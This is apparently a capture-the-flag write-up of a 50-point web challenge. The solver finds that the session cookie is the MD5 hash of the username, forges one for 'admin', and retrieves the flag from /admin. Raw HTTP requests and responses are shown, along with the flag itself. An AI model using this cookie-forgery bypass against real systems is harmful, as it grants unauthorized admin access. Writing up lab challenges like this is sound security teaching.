### Solved by Swappage

This was a 50 points challenge which was pretty simple, all we had to do was to log in as admin and retrieve the flag from the /admin page

upon registration we are asked to provide a username and a password

and we receive a cookie:


    HTTP/1.1 302 Found
    Location: /welcome
    Content-Type: text/html; charset=utf-8
    Date: Fri, 29 Apr 2016 17:32:55 GMT
    Server: Google Frontend
    Content-Length: 0
    Set-Cookie: md5-hash=3590cb8af0bbb9e78c343b52b93773c9; Path=/
    Alt-Svc: quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
    Connection: close

the cookie is the md5 of the username, so all we have to do is replace the cookie with the md5 hash of the string *admin* and visit /admin to get the flag.

    GET /admin HTTP/1.1
    Host: ernst-echidna.ctfcompetition.com
    User-Agent: Developer_JANEBO
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Cookie: md5-hash=21232f297a57a5a743894a0e4a801fc3
    Connection: close

    HTTP/1.1 200 OK
    Content-Type: text/html; charset=utf-8
    Vary: Accept-Encoding
    Date: Fri, 29 Apr 2016 17:36:27 GMT
    Server: Google Frontend
    Cache-Control: private
    Alt-Svc: quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
    Connection: close
    Content-Length: 378
```html
    <html>
      <head>
       <meta charset="utf-8">
       <title>gloomy-scorpion</title>
       <link rel="stylesheet" href="/static/bootstrap.min.css" media="screen">
      </head>
      <body>
        <div class="container">
          <h1>The authentication server says..</h1>
          <p>Congratulations, your token is &#39;CTF{renaming-a-bunch-of-levels-sure-is-annoying}&#39;</p>
        </div>
      </body>
    </html>
```

the flag is: *CTF{renaming-a-bunch-of-levels-sure-is-annoying}*
